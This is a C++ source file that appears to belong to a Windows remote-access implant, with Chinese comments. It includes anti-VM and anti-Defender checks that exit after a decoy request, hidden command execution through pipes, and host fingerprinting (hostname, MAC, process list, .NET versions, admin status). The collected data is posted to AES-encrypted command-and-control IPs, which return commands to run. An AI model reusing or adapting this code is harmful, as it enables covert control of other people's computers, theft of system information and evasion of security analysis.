#include <iostream>
#include <fstream>
#include <map>  

#include <filesystem>

#include <io.h>
#include <direct.h>
#include <tchar.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>  
#include <TlHelp32.h>

#include "Common.h"
#include "AES.h"
#include "Base64.h"
#include "HttpTools.h"
#include "Config.h"




const int LEN_NAME = 6;

//执行二进制文件，flag决定是否等待执行完成
int Common::exec(const char* bin, const BOOL flag) {
	SHELLEXECUTEINFO commend;//命令对象
	memset(&commend, 0, sizeof(SHELLEXECUTEINFO));
	commend.cbSize = sizeof(SHELLEXECUTEINFO);
	commend.fMask = SEE_MASK_NOCLOSEPROCESS;
	commend.lpVerb = _T("");
	commend.lpFile = _T(bin);//执行命令内容
	commend.nShow = SW_SHOWDEFAULT;
	ShellExecuteEx(&commend);//执行命令
	if (flag == TRUE) 
	{
		WaitForSingleObject(commend.hProcess, INFINITE);//等待执行结束
	}
	
	CloseHandle(commend.hProcess);//关闭控制台
	return 0;
}


wstring Common::string2wstring(string str)
{
	wstring result;
	////获取缓冲区大小，并申请空间，缓冲区大小按字符计算  
	//int len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.size(), NULL, 0);
	//TCHAR* buffer = new TCHAR[len + 1];
	////多字节编码转换成宽字节编码  
	//MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.size(), buffer, len);
	//buffer[len] = '\0';             //添加字符串结尾  
	////删除缓冲区并返回值  
	//result.append(buffer);
	//delete[] buffer;
	return result;
}

string Common::ExeCmd(string pszCmd)
{
	//wstring pszCmd_w = string2wstring(pszCmd);
	//wcout << "pszCmd_w is " << pszCmd_w << endl;
	// 创建匿名管道,write->read;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	HANDLE hRead, hWrite;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		//cout << "@ CreatePipe failed!" << endl;
		return (" ");
	}
	//cout << "@0" << endl;
	// 设置命令行进程启动信息(以隐藏方式启动命令并定位其输出到hWrite
	STARTUPINFO si = { sizeof(STARTUPINFO) }; // Pointer to STARTUPINFO structure;
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE; //隐藏窗口；
	si.hStdError = hWrite;
	si.hStdError = hWrite;
	si.hStdOutput = hWrite; //管道的输入端口连接命令行的输出；
	// 启动命令行
	PROCESS_INFORMATION pi;// Pointer to PROCESS_INFORMATION structure;
	if (!CreateProcess(NULL, (LPSTR)pszCmd.c_str(), NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
	{
		//cout << "@ CreateProcess failed!" << endl;
		return ("Cannot create process");
	}
	Sleep(2);
	CloseHandle(hWrite);//关闭管道的输入端口；
	// 读取命令行返回值
	string strRetTmp;
	printf("%s\n",strRetTmp);
	char buff[4096] = { 0 };
	DWORD dwRead = 0;
	strRetTmp = buff;
	while (ReadFile(hRead, buff, 1024, &dwRead, NULL))//从管道的输出端获取命令行写入的数据；
	{
		strRetTmp += buff;
		memset(buff,0,4096);
		//fflush(stdin);
	}
	//ReadFile(hRead, buff, 4096, &dwRead, NULL);
	//strRetTmp = buff;
	CloseHandle(hRead);//关闭管道的输出端口；
	//cout << "strRetTmp:" << strRetTmp << endl;

	//xx
	//

	return strRetTmp;
}

//执行命令并返回字符串结果
string Common::execCMD(char* cmd) {
	FILE* pipe = _popen(cmd, "r");
	//FILE* pipe = WinExec(cmd, SW_HIDE);
	if (!pipe) return "ERROR";
	char buffer[128];
	string result = "";
	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe) != NULL)
			result += buffer;
	}
	_pclose(pipe);
	return result;
	
}


//获取IE代理配置
string Common::getIEProxy() {
	HKEY key;
	auto ret = RegOpenKeyEx(HKEY_CURRENT_USER, R"(Software\Microsoft\Windows\CurrentVersion\Internet Settings)", 0, KEY_ALL_ACCESS, &key);
	if (ret != ERROR_SUCCESS) {
		std::cout << "openfailed: " << ret << std::endl;
		return "ProxynotEnabled";
	}

	DWORD values_count, max_value_name_len, max_value_len;
	ret = RegQueryInfoKey(key, NULL, NULL, NULL, NULL, NULL, NULL,
		&values_count, &max_value_name_len, &max_value_len, NULL, NULL);
	if (ret != ERROR_SUCCESS) {
		std::cout << "queryfailed" << std::endl;
		return "ProxynotEnabled";
	}

	std::vector<std::tuple<std::shared_ptr<char>, DWORD, std::shared_ptr<BYTE>>> values;
	for (int i = 0; i < values_count; i++) {
		std::shared_ptr<char> value_name(new char[max_value_name_len + 1],
			std::default_delete<char[]>());
		DWORD value_name_len = max_value_name_len + 1;
		DWORD value_type, value_len;
		RegEnumValue(key, i, value_name.get(), &value_name_len, NULL, &value_type, NULL, &value_len);
		std::shared_ptr<BYTE> value(new BYTE[value_len],
			std::default_delete<BYTE[]>());
		value_name_len = max_value_name_len + 1;
		RegEnumValue(key, i, value_name.get(), &value_name_len, NULL, &value_type, value.get(), &value_len);
		values.push_back(make_tuple(value_name, value_type, value));
	}

	DWORD ProxyEnable = 0;
	for (auto x : values) {
		if (strcmp(std::get<0>(x).get(), "ProxyEnable") == 0) {
			ProxyEnable = *(DWORD*)(std::get<2>(x).get());
		}
	}

	if (ProxyEnable) {
		for (auto x : values) {
			if (strcmp(std::get<0>(x).get(), "ProxyServer") == 0) {

				//std::cout << "ProxyServer: " << (char*)(std::get<2>(x).get()) << std::endl;
				return (char*)(std::get<2>(x).get());
			}
		}
	}
	else {
		//std::cout << "Proxy not Enabled" << std::endl;
		return "ProxynotEnabled";
	}

	return "ProxynotEnabled";

	
}


//创建文件夹

int Common::createDir(const char* Dir) {
	//创建路径
	try
	{
		rmdir(Dir);
	}
	catch (exception e)
	{
		Common::logReport(e.what());
	}
	if (0 != _access(Dir, 0))
	{
		mkdir(Dir);   // 返回 0 表示创建成功，-1 表示失败
	}
    return 0;
}

//反虚拟机
void Common::antVirtual(const BOOL flag) {
	//反虚拟机开关
	if (flag == TRUE)
	{
		//反虚拟机1 检测内存大小
		MEMORYSTATUSEX statex;
		statex.dwLength = sizeof(statex);
		GlobalMemoryStatusEx(&statex);
		int mem = statex.ullTotalPhys / 1024 / 1024 / 1000;
		//printf("%d G",mem);//内存大小

		if (mem < 4)
		{
			Common::fakeRequests();
			exit(0);
		}

		//反虚拟机2 检测环境语言
		LANGID lid = GetSystemDefaultLangID(); // 获取系统默认ID
		switch (lid)
		{
		case 0x0804:
			//printf("CN\n");
			break;
		case 0x0409:
			//printf("EN\n");
			Common::fakeRequests();
			exit(0);
			break;
		}

		//反defender
		CHAR cUserNameBuffer[256];
		DWORD dwUserNameSize = 256;

		if (GetUserName(cUserNameBuffer, &dwUserNameSize)) {
			//printf("The user name is %s \n", cUserNameBuffer);
			if (strstr(cUserNameBuffer, "JohnDoe")) {
				Common::fakeRequests();
				exit(0);
			}
		}
	}
}

//追加时间戳
void Common::addTimestamp(const char* DesFileName) {
	std::ofstream file;
	if (!file.bad())
	{
		time_t nowtime = time(NULL);
		file.open(DesFileName, std::ios::app);
		file << nowtime << "\n";
		file.close();
	}
}

//获取主机名_mac地址
typedef struct _ASTAT_
{
	ADAPTER_STATUS adapt;
	NAME_BUFFER NameBuff[30];
} ASTAT, * PASTAT;

string Common::getHostname() {

	char buf[256] = "";

	struct hostent* ph = 0;

	WSADATA w;

	WSAStartup(0x0101, &w);//这一行必须在使用任何SOCKET函数前写！

	gethostname(buf, 256);

	string hostName = buf;//此处获得本机名称

	//ph = gethostbyname(buf);

	//const char* IP = inet_ntoa(*((struct in_addr*)ph->h_addr_list[0]));//此处获得本机IP

	WSACleanup();

	//char* hostname;

	hostName.append("_");

	ASTAT Adapter;
	NCB Ncb;
	UCHAR uRetCode;
	LANA_ENUM lenum;
	int i = 0;

	memset(&Ncb, 0, sizeof(Ncb));
	Ncb.ncb_command = NCBENUM;
	Ncb.ncb_buffer = (UCHAR*)&lenum;
	Ncb.ncb_length = sizeof(lenum);

	uRetCode = Netbios(&Ncb);

	char* mac;
	//printf("The NCBENUM return adapter number is: %d \n ", lenum.length);
	for (i = 0; i < lenum.length; i++)
	{
		memset(&Ncb, 0, sizeof(Ncb));
		Ncb.ncb_command = NCBRESET;
		Ncb.ncb_lana_num = lenum.lana[i];
		uRetCode = Netbios(&Ncb);

		memset(&Ncb, 0, sizeof(Ncb));
		Ncb.ncb_command = NCBASTAT;
		Ncb.ncb_lana_num = lenum.lana[i];
		strcpy((char*)Ncb.ncb_callname, "* ");
		Ncb.ncb_buffer = (unsigned char*)&Adapter;
		Ncb.ncb_length = sizeof(Adapter);
		uRetCode = Netbios(&Ncb);

		if (uRetCode == 0)
		{
			sprintf(mac, "%02x-%02x-%02x-%02x-%02x-%02x",
			//sprintf(mac, "%02X%02X%02X%02X%02X%02X ",
				Adapter.adapt.adapter_address[0],
				Adapter.adapt.adapter_address[1],
				Adapter.adapt.adapter_address[2],
				Adapter.adapt.adapter_address[3],
				Adapter.adapt.adapter_address[4],
				Adapter.adapt.adapter_address[5]
			);
			//printf( "The Ethernet Number on LANA %d is: %s\n ", lenum.lana[i], mac);
			
		}
		
	}
	hostName.append(mac);
	//printf("%s\n",hostName.c_str());

	return hostName.c_str();
}


//获取所有Donet版本 Ref: https://www.cnblogs.com/humble/archive/2013/03/23/2976747.html
enum NetVersion {
	V_1_0 = 0X1,
	V_2_0_SP1 = 0X2,
	V_2_0 = 0X4,
	V_3_0 = 0X8,
	V_3_0_SP1 = 0X10,
	V_4_0 = 0x20,
	V_5_0 = 0x40
};
string Common::getNetAllVersions() {

	HKEY hKey;
	LPCTSTR path_V_1_0 = TEXT("SOFTWARE\\Microsoft\\.NETFramework\\v1.0");
	LPCTSTR path_V_2_0_SP1 = TEXT("SOFTWARE\\Microsoft\\.NETFramework\\v2.0 SP1");
	LPCTSTR path_V_2_0 = TEXT("SOFTWARE\\Microsoft\\.NETFramework\\v2.0.50727");
	LPCTSTR path_V_3_0 = TEXT("SOFTWARE\\Microsoft\\.NETFramework\\v3.0");
	LPCTSTR path_V_3_0_SP1 = TEXT("SOFTWARE\\Microsoft\\.NETFramework\\v3.0 SP1");
	LPCTSTR path_V_4_0 = TEXT("SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319");
	LONG rpath_V_1_0 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path_V_1_0, 0, KEY_READ, &hKey);
	::RegCloseKey(hKey);
	LONG rpath_V_2_0_SP1 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path_V_2_0_SP1, 0, KEY_READ, &hKey);
	::RegCloseKey(hKey);

	LONG rpath_V_2_0 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path_V_2_0, 0, KEY_READ, &hKey);
	::RegCloseKey(hKey);

	LONG rpath_V_3_0 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path_V_3_0, 0, KEY_READ, &hKey);
	::RegCloseKey(hKey);
	LONG rpath_V_3_0_SP1 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path_V_3_0_SP1, 0, KEY_READ, &hKey);
	::RegCloseKey(hKey);
	LONG rpath_V_4_0 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path_V_4_0, 0, KEY_READ, &hKey);
	::RegCloseKey(hKey);
	int result = 0;
	string allDonetVer = "";
	if (rpath_V_1_0 == ERROR_SUCCESS) {
		result = result | NetVersion::V_1_0;
		allDonetVer.append("1.0,");
		//cout << "系统已经安装.NET:V_1_0" << endl;
	}
	if (rpath_V_2_0_SP1 == ERROR_SUCCESS) {
		result = result | NetVersion::V_2_0_SP1;
		allDonetVer.append("2_0_SP1,");
		//cout << "系统已经安装.NET:V_2_0_SP1" << endl;
	}
	if (rpath_V_2_0 == ERROR_SUCCESS) {
		result = result | NetVersion::V_2_0;
		allDonetVer.append("2_0,");
		//cout << "系统已经安装.NET:V_2_0" << endl;
	}
	if (rpath_V_3_0 == ERROR_SUCCESS) {
		result = result | NetVersion::V_3_0;
		allDonetVer.append("3_0,");
		//cout << "系统已经安装.NET:V_3_0" << endl;
	}
	if (rpath_V_3_0_SP1 == ERROR_SUCCESS) {
		result = result | NetVersion::V_3_0_SP1;
		allDonetVer.append("3_0_SP1,");
		//cout << "系统已经安装.NET:V_3_0_SP1" << endl;
	}
	if (rpath_V_4_0 == ERROR_SUCCESS) {
		result = result | NetVersion::V_4_0;
		allDonetVer.append("4_0,");
		//cout << "系统已经安装.NET:V_4_0" << endl;
	}
	return allDonetVer;
}


//判断系统位数
BOOL Common::is64bitSystem()
{

	SYSTEM_INFO sInfo;
	GetNativeSystemInfo(&sInfo);
	if (sInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
		sInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		return TRUE;
	else
		return FALSE;
}

//遍历获取所有进程名 有问题待修复

string get_string(string res) {

	//删除换行符
	int r = res.find('\r\n');
	while (r != string::npos)
	{
		if (r != string::npos)
		{
			res.replace(r, 1, "");
			r = res.find('\r\n');
		}
	}

	//删除所有空格
	res.erase(std::remove_if(res.begin(), res.end(), std::isspace), res.end());
	return res;

}


string Common::getProcessList() {
	//pro

	string res;

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		//cout << "CreateToolhelp32Snapshot Error!" << endl;;
		res.append("CreateToolhelp32Snapshot Error");
		return res;
	}

	BOOL bResult = Process32First(hProcessSnap, &pe32);

	int num(0);

	

	while (bResult)
	{
		string tmp;
		tmp = pe32.szExeFile;
		//sprintf(res,"%s-",tmp.c_str())
		//sprintf(tmp,"%s-",tmp.c_str());
		res.append(tmp.c_str());
		res.append(";");
		bResult = Process32Next(hProcessSnap, &pe32);
	}

	CloseHandle(hProcessSnap);
	
	res = get_string(res);
	return res;
	//pro
}

string Common::getTimeStmp() {

	srand(time(NULL));
	std::string timeStmp = "";
	time_t systime = time(NULL);
	stringstream ss;
	ss << systime;
	timeStmp = ss.str();
	return timeStmp;

}


BOOL Common::isAdmin()
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

char dec2hexChar2(short int n) {
	if (0 <= n && n <= 9) {
		return char(short('0') + n);
	}
	else if (10 <= n && n <= 15) {
		return char(short('A') + n - 10);
	}
	else {
		return char(0);
	}
}

short int hexChar2dec2(char c) {
	if ('0' <= c && c <= '9') {
		return short(c - '0');
	}
	else if ('a' <= c && c <= 'f') {
		return (short(c - 'a') + 10);
	}
	else if ('A' <= c && c <= 'F') {
		return (short(c - 'A') + 10);
	}
	else {
		return -1;
	}
}

string escapeURL2(const string& URL)
{
	string result = "";
	for (unsigned int i = 0; i < URL.size(); i++) {
		char c = URL[i];
		if (
			('0' <= c && c <= '9') ||
			('a' <= c && c <= 'z') ||
			('A' <= c && c <= 'Z') ||
			c == '/' || c == '.'
			) {
			result += c;
		}
		else {
			int j = (short int)c;
			if (j < 0) {
				j += 256;
			}
			int i1, i0;
			i1 = j / 16;
			i0 = j - i1 * 16;
			result += '%';
			result += dec2hexChar2(i1);
			result += dec2hexChar2(i0);
		}
	}
	return result;
}

//日志上报
void Common::logReport(const char* data) {


	while (true)
	{
		printf("\nloginfo\n");
		try
		{
			srand((unsigned)time(NULL));

			string ip = Common::aesDecrypt(ips[(rand() % (iplen + 1))]);



			//string url = "http://182.92.116.44/?c=client&a=report";
			string url = "https://";
			url.append(ip);
			url.append("/?c=client&a=report");

			printf("\n%s\n",url.c_str());

			string hostnameraw33 = Common::getHostname();

			string hostname233 = escapeURL2(hostnameraw33.c_str());
			string hostname33 = curl_escape(hostname233.c_str(), hostname233.size());
			printf("[+] hostname: %s\n", hostname233.c_str());

			string postData = "action=log&hostname=";
			postData.append(hostname33);
			postData.append("&content=");
			postData.append(data);

			//action=log&hostname=testaaa&content=xxxxxxaction=log&hostname=testaaa&content=xxxxxx

			HttpTools::HttpPost(url, postData.c_str(), 10);
			break;
		}
		catch (exception e)
		{
			Common::logReport(e.what());
			Common::logReport(data);
		}
	}

	
	//printf("%s\n", postData.c_str());
	//string processList = Common::getProcessList();
}


//基本信息上报
string Common::baseInfoReport(const char* data) {

	

	while (true)
	{
		printf("\nbaseinfo\n");
		try
		{
			srand((unsigned)time(NULL));

			string ip = Common::aesDecrypt(ips[(rand() % (iplen + 1))]);

			string url = "https://";
			url.append(ip);
			url.append("/?c=client&a=report");

			printf("\n%s\n", url.c_str());

			//string hostname = Common::getHostname();

			string postData = "";
			postData.append(data);

			string resp = HttpTools::HttpPost(url, data, 20);

			printf("\ncommand: %s\n", resp.c_str());

			return resp;

		}
		catch (exception e)
		{
			Common::logReport(e.what());
			Common::baseInfoReport(data);
		}
	}


	//printf("%s\n", postData.c_str());
	//string processList = Common::getProcessList();
}


//假请求
void Common::fakeRequests() {
	string strResponse;
	try
	{
		HttpTools::HttpGet("https://www.baidu.com", strResponse, 10);
	}
	catch (const std::exception&)
	{
		exit(0);
	}
}

//AES加解密部分
//const char g_key[17] = "qaxredteam666666";
//const char g_iv[17] = "qaxateam88888888";
const char g_key[17] = "blueteamdage2333";
const char g_iv[17] = "fangguodidiba666";

string Common::aesEncrypt(const string& strSrc) {
	size_t length = strSrc.length();
	int block_num = length / BLOCK_SIZE + 1;
	//明文
	char* szDataIn = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);
	strcpy(szDataIn, strSrc.c_str());

	//进行PKCS7Padding填充。
	int k = length % BLOCK_SIZE;
	int j = length / BLOCK_SIZE;
	int padding = BLOCK_SIZE - k;
	for (int i = 0; i < padding; i++)
	{
		szDataIn[j * BLOCK_SIZE + k + i] = padding;
	}
	szDataIn[block_num * BLOCK_SIZE] = '\0';

	//加密后的密文
	char* szDataOut = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);

	//进行进行AES的CBC模式加密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);
	string str = base64_encode((unsigned char*)szDataOut,
		block_num * BLOCK_SIZE);
	delete[] szDataIn;
	delete[] szDataOut;
	return str;

}

string Common::aesDecrypt(const string& strSrc) {
	try
	{
		string strData = base64_decode(strSrc);
		size_t length = strData.length();
		//密文
		char* szDataIn = new char[length + 1];
		memcpy(szDataIn, strData.c_str(), length + 1);
		//明文
		char* szDataOut = new char[length + 1];
		memcpy(szDataOut, strData.c_str(), length + 1);

		//进行AES的CBC模式解密
		AES aes;
		aes.MakeKey(g_key, g_iv, 16, 16);
		aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

		//去PKCS7Padding填充
		if (0x00 < szDataOut[length - 1] <= 0x16)
		{
			int tmp = szDataOut[length - 1];
			for (int i = length - 1; i >= length - tmp; i--)
			{
				if (szDataOut[i] != tmp)
				{
					memset(szDataOut, 0, length);
					//cout << "error" << endl;
					exit(42);
					srand((unsigned)time(NULL));
					//int iplen = sizeof(ips) / sizeof(ips[0]);
					//string ip = Common::aesDecrypt(ips[(rand() % (iplen + 1))]);
					break;
				}
				else
					szDataOut[i] = 0;
			}
		}
		string strDest(szDataOut);
		delete[] szDataIn;
		delete[] szDataOut;
		return strDest;
	}
	catch (exception e)
	{
		Common::logReport(e.what());
		exit(0);
	}
}